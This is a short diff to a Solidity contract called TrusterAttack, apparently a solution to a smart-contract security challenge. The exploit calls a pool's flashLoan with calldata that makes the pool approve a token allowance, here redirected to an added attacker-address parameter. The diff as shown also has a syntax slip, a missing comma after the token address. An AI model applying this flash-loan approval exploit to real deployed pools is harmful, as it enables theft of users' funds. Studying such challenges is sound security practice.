@@ -17,6 +17,7 @@ contract TrusterAttack {
 
     constructor(address poolAddress,
                 address tokenAddress,
+                address attackerAddress
                 )
     {
         //Idea
@@ -26,7 +27,7 @@ contract TrusterAttack {
         uint256 balance = IERC20(tokenAddress).balanceOf(poolAddress);
         IPoolFunc(poolAddress).flashLoan(
             0,
-            address(this),
+            attackerAddress,
             tokenAddress,
             abi.encodeWithSignature(
                 "approve(address, uint256)",
